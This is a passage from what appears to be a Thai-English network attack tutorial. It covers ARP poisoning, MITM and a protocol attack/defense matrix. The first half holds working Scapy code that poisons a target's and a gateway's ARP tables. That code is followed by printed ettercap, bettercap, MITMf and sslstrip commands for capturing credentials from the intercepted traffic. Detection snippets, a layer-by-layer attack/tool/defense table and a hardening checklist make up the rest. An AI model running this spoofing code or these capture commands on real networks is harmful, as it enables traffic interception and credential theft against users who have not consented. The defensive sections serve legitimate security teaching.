        sent_packets = 0
        self.running = True
        
        try:
            while self.running:
                # Tell target: "I am the gateway"
                target_arp = ARP(
                    op=2,  # is-at (reply)
                    pdst=target_ip,
                    hwdst=self.target_mac,
                    psrc=self.gateway  # Lie: pretend to be gateway
                )
                
                # Tell gateway: "I am the target"
                gateway_arp = ARP(
                    op=2,
                    pdst=self.gateway,
                    hwdst=self.gateway_mac,
                    psrc=target_ip  # Lie: pretend to be target
                )
                
                send(target_arp, verbose=False)
                if poison_gateway:
                    send(gateway_arp, verbose=False)
                
                sent_packets += 2
                print(f"\r[*] Packets sent: {sent_packets}", end='')
                time.sleep(2)
        
        except KeyboardInterrupt:
            print("\n[*] Stopping ARP poisoning...")
            self.restore_arp(target_ip)
    
    def restore_arp(self, target_ip: str):
        """Restore ARP tables"""
        print("[*] Restoring ARP tables...")
        
        # Send correct ARP replies to restore
        for _ in range(5):
            send(
                ARP(op=2, pdst=self.gateway, hwdst='ff:ff:ff:ff:ff:ff',
                    psrc=target_ip, hwsrc=self.target_mac),
                verbose=False
            )
            send(
                ARP(op=2, pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff',
                    psrc=self.gateway, hwsrc=self.gateway_mac),
                verbose=False
            )
        
        print("[+] ARP tables restored")
    
    def capture_credentials(self, target_ip: str, output_file: str = '/tmp/captured_creds.txt'):
        """Capture credentials from MITM position"""
        capture_tools = f"""
# After ARP poisoning -> capture credentials

# 1. Ettercap (all-in-one MITM tool)
sudo ettercap -T -q -M arp:remote /{self.gateway}// /{target_ip}// -w /tmp/capture.pcap

# 2. Bettercap สำหรับ HTTP/HTTPS credential capture
bettercap
bettercap > net.probe on
bettercap > set arp.spoof.targets {target_ip}
bettercap > arp.spoof on
bettercap > set net.sniff.verbose true
bettercap > net.sniff on

# 3. MITMf
python3 mitmf.py \\
    -i {self.interface} \\
    --target {target_ip} \\
    --gateway {self.gateway} \\
    --spoof \\
    --arp

# 4. SSLstrip + ARP poisoning
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000
arpspoof -i {self.interface} -t {target_ip} {self.gateway} &
sslstrip -l 10000
"""
        print(capture_tools)
    
    def detect_arp_poisoning(self):
        """Detect ARP poisoning attacks"""
        detection_code = """
# ARP Poisoning Detection

# Method 1: ARPwatch
apt-get install arpwatch -y
arpwatch -i eth0 -f /var/lib/arpwatch/arp.dat

# Method 2: XArp (GUI tool)

# Method 3: Manual check
# อ่าน ARP table และหา duplicate MACs
arp -n | sort -k3 | uniq -d -f2

# Method 4: Scapy detection
from scapy.all import *

def detect_arp_attack(pkt):
    if pkt.haslayer(ARP) and pkt[ARP].op == 2:
        real_mac = getmacbyip(pkt[ARP].psrc)
        if real_mac and real_mac != pkt[ARP].hwsrc:
            print(f'[!] ARP ATTACK DETECTED!')
            print(f'    IP: {pkt[ARP].psrc}')
            print(f'    Expected MAC: {real_mac}')
            print(f'    Received MAC: {pkt[ARP].hwsrc}')

sniff(filter='arp', prn=detect_arp_attack, store=0)
"""
        print(detection_code)

if __name__ == '__main__':
    attacker = ARPMITMAttacker(interface='eth0', gateway='192.168.1.1')
    print("[*] ARP Poisoning framework ready")
    print("[*] Example: attacker.poison_target('192.168.1.100')")
    attacker.detect_arp_poisoning()
```

---

## Steps 508-510: Network Protocol Security Summary

```python
#!/usr/bin/env python3
# Network Protocol Attack Summary and Defenses

NETWORK_ATTACK_MATRIX = {
    'Layer 2': [
        {'attack': 'ARP Spoofing', 'tool': 'arpspoof, bettercap', 'defense': 'Dynamic ARP Inspection'},
        {'attack': 'VLAN Hopping', 'tool': 'yersinia, scapy', 'defense': 'Disable DTP, change native VLAN'},
        {'attack': 'STP Attack', 'tool': 'yersinia', 'defense': 'BPDU Guard, Root Guard'},
        {'attack': 'MAC Flooding', 'tool': 'macof', 'defense': 'Port security, MAC limiting'},
    ],
    'Layer 3': [
        {'attack': 'ICMP Redirect', 'tool': 'scapy', 'defense': 'Disable ICMP redirects'},
        {'attack': 'IP Spoofing', 'tool': 'scapy, hping3', 'defense': 'BCP38/ingress filtering'},
        {'attack': 'OSPF Injection', 'tool': 'loki', 'defense': 'OSPF MD5 auth'},
        {'attack': 'BGP Hijacking', 'tool': 'exabgp, gobgp', 'defense': 'RPKI, BGPsec'},
    ],
    'Layer 4': [
        {'attack': 'TCP SYN Flood', 'tool': 'hping3', 'defense': 'SYN cookies, rate limiting'},
        {'attack': 'TCP Session Hijack', 'tool': 'scapy, hunt', 'defense': 'TLS, TCP timestamps'},
        {'attack': 'UDP Amplification', 'tool': 'scapy', 'defense': 'BCP38, rate limiting'},
    ],
    'Layer 7': [
        {'attack': 'DNS Cache Poisoning', 'tool': 'scapy', 'defense': 'DNSSEC, 0x20 encoding'},
        {'attack': 'DNS Tunneling', 'tool': 'dnscat2, iodine', 'defense': 'DNS filtering, RPZ'},
        {'attack': 'SSL MITM', 'tool': 'mitmproxy, sslstrip', 'defense': 'HSTS, cert pinning'},
        {'attack': 'BGP Route Leak', 'tool': 'exabgp', 'defense': 'Route filtering, RPKI'},
    ]
}

def generate_network_security_report() -> str:
    """Generate comprehensive network security report"""
    report_lines = [
        "Network Security Assessment - Protocol Layer Analysis",
        "=" * 60
    ]
    
    for layer, attacks in NETWORK_ATTACK_MATRIX.items():
        report_lines.append(f"\n{layer} Attacks:")
        for attack_info in attacks:
            report_lines.append(
                f"  [{attack_info['attack']}]\n"
                f"    Tool: {attack_info['tool']}\n"
                f"    Defense: {attack_info['defense']}"
            )
    
    return '\n'.join(report_lines)


NETWORK_HARDENING_CHECKLIST = """
# Network Security Hardening Checklist

# Layer 2
☐ Enable Dynamic ARP Inspection (DAI)
☐ Enable DHCP snooping
☐ Disable DTP, configure trunk explicitly
☐ Change native VLAN from default (VLAN 1)
☐ Enable BPDU Guard on access ports
☐ Configure port security
☐ Separate management VLAN

# Layer 3
☐ Implement BCP38 (ingress filtering)
☐ Enable OSPF/BGP authentication
☐ Deploy RPKI for BGP route validation
☐ Disable ICMP redirects
☐ Enable uRPF (Reverse Path Forwarding)

# DNS Security
☐ Deploy DNSSEC
☐ Use DNS over HTTPS (DoH) or DNS over TLS (DoT)
☐ Block DNS tunneling at perimeter
☐ Monitor for unusual DNS queries
☐ Implement Response Policy Zones (RPZ)

# TLS Security
☐ Disable SSL 3.0, TLS 1.0, TLS 1.1
☐ Enable HSTS with long max-age
☐ Implement Certificate Transparency
☐ Use certificate pinning for mobile apps
☐ Monitor certificate expiry
☐ Use strong cipher suites (TLS_AES_256_GCM_SHA384)
"""

if __name__ == '__main__':
    report = generate_network_security_report()
    print(report)
    print(NETWORK_HARDENING_CHECKLIST)
```

---

## สรุป Part 51

| Step | หัวข้อ | เครื่องมือหลัก |
|------|--------|---------------|
| 501 | BGP Hijacking | ExaBGP, GoBGP, RPKI |
| 502 | DNS Advanced Attacks | dnscat2, iodine, subfinder |
| 503 | VLAN Hopping | Yersinia, Scapy |
| 504 | IPv6 Security | THC-IPv6, parasite6, fake_router6 |
| 505 | OSPF/RIP Attacks | Loki, Scapy |
| 506 | SSL/TLS Attacks | testssl.sh, sslscan, Nmap NSE |
| 507 | ARP Poisoning/MITM | arpspoof, bettercap, MITMf |
| 508-510 | Network Security Summary | Comprehensive attack matrix |

**Defense Priorities:**
- RPKI for BGP route origin validation
- DNSSEC + monitoring for DNS attacks
- DAI/DHCP snooping for Layer 2
- Disable TLS 1.0/1.1, enforce modern TLS
